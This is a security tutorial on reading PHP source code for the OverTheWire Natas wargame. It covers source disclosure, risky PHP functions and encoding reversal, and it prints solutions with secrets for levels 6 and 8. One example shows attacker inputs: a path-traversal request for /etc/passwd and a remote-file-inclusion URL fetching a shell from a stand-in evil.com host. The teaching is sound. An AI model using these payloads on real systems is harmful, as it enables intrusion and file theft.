# 🌐 Web Security — Reading PHP Source Code

> The server runs the PHP code and shows you the result.
> But sometimes the source code itself is visible too — and it contains secrets.

---

## 📋 Table of Contents

- [What Is PHP?](#what-is-php)
- [Where Is Source Code Visible?](#where-is-source-code-visible)
- [Critical PHP Functions](#critical-php-functions)
- [include and require](#include-and-require)
- [Encoding Functions](#encoding-functions)
- [Usage in Natas](#usage-in-natas)

---

## What Is PHP?

**PHP** is a programming language that runs on the server side. When the user requests the page, the server runs the PHP code, produces HTML as output, and sends it to the browser. The browser normally doesn't see the PHP code — it only sees the result.

```
File: index.php          What the browser sees:
┌─────────────────┐       ┌─────────────────┐
│ <?php           │       │ <html>          │
│   $x = 2 + 2;   │  →→→   │   Result: 4     │
│   echo $x;      │       │ </html>         │
│ ?>              │       └─────────────────┘
└─────────────────┘
```

---

## Where Is Source Code Visible?

### 1. The Page Provides the "View Source" Link Itself

In Natas, most levels place a link like this at the bottom of the page:

```html
<a href="index-source.html">View sourcecode</a>
```

When this link is clicked, the PHP code is shown with syntax highlighting.

### 2. Opening the Included File Directly

```php
include "includes/secret.inc";
```

PHP files (`.php`) are executed on the server side. But files with the `.inc` extension are served as plain text on some servers:

```bash
# Open this URL directly
curl http://natas6.natas.labs.overthewire.org/includes/secret.inc
# <?php $secret = "XXXXXXXXXXX"; ?>
```

### 3. Backup Files

If there are files like `.php.bak`, `.php.old`, `.php~` on the server, they are not executed and are returned as plain text:

```bash
curl http://example.com/index.php.bak    # returns the source code as plain text
curl http://example.com/index.php~       # editor backup
```

---

## Critical PHP Functions

When you see the following functions in the source code, analyze them carefully:

### Code Execution

| Function | What It Does | Danger |
|-----------|----------|---------|
| `system($cmd)` | Runs a shell command, prints its output to the screen | Command Injection |
| `passthru($cmd)` | Runs a shell command, returns raw output | Command Injection |
| `exec($cmd)` | Runs a shell command, returns the last line | Command Injection |
| `shell_exec($cmd)` | Runs a shell command, returns the full output | Command Injection |
| `eval($code)` | Runs it as PHP code | Code Injection |
| `preg_replace('/pat/e', $repl, $str)` | Can run code in old PHP | Code Injection |

### File Reading

| Function | What It Does | Danger |
|-----------|----------|---------|
| `include($file)` | Includes the file as PHP | LFI |
| `require($file)` | Like include, halts on error | LFI |
| `file_get_contents($file)` | Reads the file as a string | LFI |
| `fopen($file, 'r')` | Opens the file | LFI |
| `readfile($file)` | Reads and outputs the file | LFI |

### Comparison

| Function/Operator | Danger |
|--------------------|---------|
| `==` (loose comparison) | Type juggling — covered in Layer 4 |
| `strcmp($a, $b)` | Bypassable when used with an array — covered in Layer 4 |
| `md5($str)` | Magic hash vulnerability — covered in Layer 4 |

---

## include and require

`include` and `require` include the contents of another file as if it were written at that line.

```php
<?php
include "config.php";      // variables in config.php can be used here
include "includes/secret.inc";  // include the secret variable
?>
```

### Dangerous Usage from a Security Standpoint

```php
// BAD: User input is passed directly to include
$page = $_GET['page'];
include($page);

// The attacker does this:
// ?page=../../../../etc/passwd
// ?page=http://evil.com/shell.php   (RFI — Remote File Inclusion)
```

### Finding Included Files

When you see `include` or `require` in the source code:

```php
include "includes/secret.inc";
//              ↑
//   Open this file directly from the URL
```

```bash
curl -u natas6:[password] \
     http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

---

## Encoding Functions

If you see an encrypted/encoded value in PHP source code, you need to apply the inverse.

### base64_encode / base64_decode

```php
$encoded = base64_encode("secret_data");   // "c2VjcmV0X2RhdGE="
$decoded = base64_decode($encoded);          // "secret_data"
```

If you see `base64_encode($secret)` in the source code, you need to decode the Base64 value that arrives as a cookie or parameter.

### strrev — Reversing a String

```php
$reversed = strrev("to_be_reversed");
// "desrever_eb_ot" → reversed back: "to_be_reversed"
```

### hex2bin / bin2hex

```php
$hex    = bin2hex("natas");       // "6e61746173"
$string = hex2bin("6e61746173");  // "natas"
```

### Chaining (Natas 8 Style)

```php
// Encoding (the real Natas 8 order — base64 INNERMOST, hex OUTERMOST):
$encodedSecret = bin2hex(strrev(base64_encode($secret)));

// To take the inverse (reverse order):
// 1. hex2bin
// 2. strrev
// 3. base64_decode
```

```bash
# Take the inverse in the terminal
echo "3d3d516343746d4d6d6c315669563362" | python3 -c "
import sys, base64
encoded = sys.stdin.read().strip()
step1 = bytes.fromhex(encoded)            # hex2bin
step2 = step1[::-1]                       # strrev
step3 = base64.b64decode(step2)           # base64_decode
print(step3.decode())                     # → oubWYf2kBq
"
```

Or with CyberChef: `From Hex` → `Reverse` → `From Base64`

---

## Usage in Natas

### Natas 6 — Secret Hidden via include

**Source code:**

```php
<?php
include "includes/secret.inc";

if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

**Analysis:**
- The `$secret` variable comes from the `includes/secret.inc` file
- Open that file directly

```bash
curl -u natas6:[password] \
     http://natas6.natas.labs.overthewire.org/includes/secret.inc
# <?php $secret = "FOEIUWGHFEEUHOFUOIU"; ?>
```

We found the secret. Fill the form with this value → get the password.

---

### Natas 8 — Chained Encoding

**Source code:**

```php
<?php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted...";
    } else {
        print "Wrong secret";
    }
}
?>
```

**Analysis:**

`encodeSecret()` encodes by applying these steps:
1. `base64_encode($secret)`
2. `strrev(...)` — reverse the string
3. `bin2hex(...)` — convert to hex

To take the inverse, apply these steps in reverse order:
1. `hex2bin("3d3d516343746d4d6d6c315669563362")`
2. `strrev(...)` — reverse the string
3. `base64_decode(...)` — Base64 decode

```bash
python3 -c "
import base64
step1 = bytes.fromhex('3d3d516343746d4d6d6c315669563362')
step2 = step1[::-1]
step3 = base64.b64decode(step2)
print(step3.decode())
"
# oubWYf2kBq
```

Fill the form with `oubWYf2kBq` → get the password.

---

### Reading PHP Source Code — Checklist

```
When you see the source code:
  ☐ Find files included via include/require → open them from the URL
  ☐ Note where system/passthru/exec appear → could be Command Injection
  ☐ Find dynamic includes like include($_GET['...']) → could be LFI
  ☐ Detect encoding functions (base64, strrev, hex) → take the inverse
  ☐ Note the comparisons (== vs ===, strcmp) → could be Type juggling
  ☐ Look at where values from $_GET, $_POST, $_COOKIE are used
```

---

## 🔗 Resources

- [PHP Manual — include](https://www.php.net/manual/en/function.include.php)
- [PHP Manual — base64_encode](https://www.php.net/manual/en/function.base64-encode.php)
- [PortSwigger — Server-side Vulnerabilities](https://portswigger.net/web-security/server-side)
- [CyberChef](https://gchq.github.io/CyberChef/) — for encoding/decoding

---

**Previous topic:** [04_cookie_manipulation.md](./04_cookie_manipulation.md)
**Next topic:** [06_encoding_and_obfuscation.md](./06_encoding_and_obfuscation.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
